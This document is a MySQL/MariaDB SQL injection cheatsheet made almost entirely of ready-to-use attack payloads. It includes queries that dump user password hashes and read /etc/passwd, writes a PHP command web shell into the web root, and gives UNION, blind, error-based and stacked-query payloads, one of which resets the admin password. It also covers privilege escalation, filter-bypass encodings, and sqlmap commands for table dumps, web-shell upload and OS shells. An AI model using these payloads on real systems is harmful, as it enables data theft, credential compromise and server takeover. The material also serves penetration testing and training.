# MySQL / MariaDB SQL Injection Cheatsheet

## Version & Info
```sql
SELECT version()
SELECT @@version
SELECT @@global.version
SELECT @@datadir
SELECT @@basedir
SELECT @@secure_file_priv
SELECT user()
SELECT current_user()
SELECT @@hostname
SELECT @@global.secure_file_priv
```

## Database Enumeration
```sql
-- All databases
SELECT schema_name FROM information_schema.schemata

-- Current database
SELECT database()

-- Tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Tables in specific DB
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'

-- Columns in table
SELECT column_name,column_type FROM information_schema.columns
WHERE table_schema='target_db' AND table_name='users'
```

## User Enumeration
```sql
-- All users and hashes
SELECT user,authentication_string FROM mysql.user
SELECT user,password FROM mysql.user  -- MySQL < 5.7

-- Current user privileges
SHOW GRANTS FOR CURRENT_USER()
SELECT * FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=QUOTE(user())

-- Is DBA?
SELECT COUNT(*) FROM information_schema.USER_PRIVILEGES
WHERE PRIVILEGE_TYPE='SUPER' AND GRANTEE=CONCAT(QUOTE(user()),'@''%''')
```

## Data Extraction
```sql
-- Concatenate multiple rows
SELECT GROUP_CONCAT(table_name SEPARATOR ',')
FROM information_schema.tables WHERE table_schema=database()

-- Single row extraction (for blind injection)
SELECT table_name FROM information_schema.tables
WHERE table_schema=database() LIMIT 0,1

-- Specific data
SELECT username,password FROM users LIMIT 0,10
```

## File Operations
```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('/var/www/html/config.php')

-- Check secure_file_priv (empty = no restriction)
SELECT @@secure_file_priv

-- Write file (requires FILE privilege + writable dir)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT 0x3c3f706870... INTO DUMPFILE '/var/www/html/shell.php'
```

## Boolean Blind Payloads
```sql
-- True/False test
AND 1=1    (true)
AND 1=2    (false)

-- Extract version char by char
AND SUBSTRING(VERSION(),1,1)='5'
AND ASCII(SUBSTRING(VERSION(),1,1))>53

-- Extract database name
AND SUBSTRING(DATABASE(),1,1)='t'
```

## Error-Based Payloads
```sql
-- FLOOR + RAND method
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x
FROM information_schema.tables GROUP BY x)a)

-- EXTRACTVALUE (MySQL >= 5.1)
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name)
FROM information_schema.tables WHERE table_schema=database())))

-- UPDATEXML
AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)
```

## UNION-Based Payloads
```sql
-- Find column count
ORDER BY 1--
ORDER BY 2--
ORDER BY N-- (until error)

-- Find reflected columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--

-- Extract data
UNION SELECT 1,database(),3--
UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--
UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
```

## Time-Based Payloads
```sql
-- Basic sleep
AND SLEEP(5)
AND IF(1=1,SLEEP(5),0)

-- Conditional data extraction
AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)
AND IF(ASCII(SUBSTRING(database(),1,1))>115,SLEEP(5),0)
```

## Stacked Queries
```sql
-- Test stacking
; SELECT 1--

-- Write file via stacking
; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Create admin user (if UPDATE privilege)
; UPDATE users SET password=MD5('hacked') WHERE username='admin'--
```

## Privilege Escalation
```sql
-- Grant privileges (requires GRANT privilege)
GRANT ALL PRIVILEGES ON *.* TO 'lowpriv'@'%'

-- Create new admin
INSERT INTO mysql.user VALUES(...)
FLUSH PRIVILEGES
```

## Bypass Techniques
```sql
-- Comment variations
SELECT/**/1
SELECT/*!*/1
SELECT /*!50000*/1

-- Case variations
SeLeCt
sElEcT

-- Hex encoding strings
WHERE username=0x61646d696e   -- 'admin'

-- CHAR() function
WHERE username=CHAR(97,100,109,105,110)   -- 'admin'
```

## SQLMap Commands for MySQL
```bash
# Basic detection
sqlmap -u "URL?id=1" --dbms=mysql --batch

# Full enumeration
sqlmap -u "URL?id=1" --dbms=mysql --current-user --current-db --is-dba --dbs --batch

# Dump specific table
sqlmap -u "URL?id=1" --dbms=mysql -D webapp -T users --dump --batch

# File read
sqlmap -u "URL?id=1" --dbms=mysql --file-read=/etc/passwd --batch

# File write (webshell)
sqlmap -u "URL?id=1" --dbms=mysql --file-write=shell.php --file-dest=/var/www/html/shell.php --batch

# OS shell (if DBA)
sqlmap -u "URL?id=1" --dbms=mysql --os-shell --batch
```
